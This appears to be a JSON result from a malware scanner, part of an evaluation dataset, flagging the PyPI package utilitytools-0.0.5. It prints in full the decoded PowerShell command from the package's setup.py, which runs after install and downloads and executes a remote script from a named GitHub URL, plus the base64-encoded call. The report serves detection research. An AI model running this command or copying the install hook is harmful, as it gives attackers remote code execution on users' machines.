{
  "package_name": "utilitytools-0.0.5",
  "total_matches": 2,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/utilitytools-0.0.5/utilitytools-0.0.5/setup.py",
      "file_name": "setup.py",
      "detection_count": 2,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "The code contains a function notmalfunc() that executes a base64-decoded string via os.system. The decoded command is: 'powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/IncsecRishiel/wdwdwdw/main/script.ps1'))\"'. This command downloads and executes a remote PowerShell script from a GitHub URL, which is a classic technique for remote code execution and is highly indicative of malware. Furthermore, the AfterInstall class is set to run this function automatically after package installation, meaning any user installing this package will unknowingly execute the malicious payload.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "33",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(\nname=\"utilitytools\",\nversion=VERSION,\nauthor=\"Anthony Clegg\",\nauthor_email=\"<anthonyclegg69420@gmail.com>\",\ndescription=DESCRIPTION,\nlong_description_content_type=\"text/markdown\",\nlong_description=LONG_DES...\n},\n)",
          "full_match": "* This package is overwriting the 'install' command in setup.py at utilitytools-0.0.5/setup.py:33",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/utilitytools-0.0.5/utilitytools-0.0.5/setup.py",
          "relative_path": "utilitytools-0.0.5/setup.py"
        },
        {
          "line_number": "16",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "os.system(b64d(\"cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIFwiSW52b2tlLUV4cHJlc3Npb24gKChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSW5jc2VjUmlzaGll...cpKVwi\"))",
          "full_match": "* This package is executing OS commands in the setup.py file at utilitytools-0.0.5/setup.py:16",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/utilitytools-0.0.5/utilitytools-0.0.5/setup.py",
          "relative_path": "utilitytools-0.0.5/setup.py"
        }
      ]
    }
  ]
}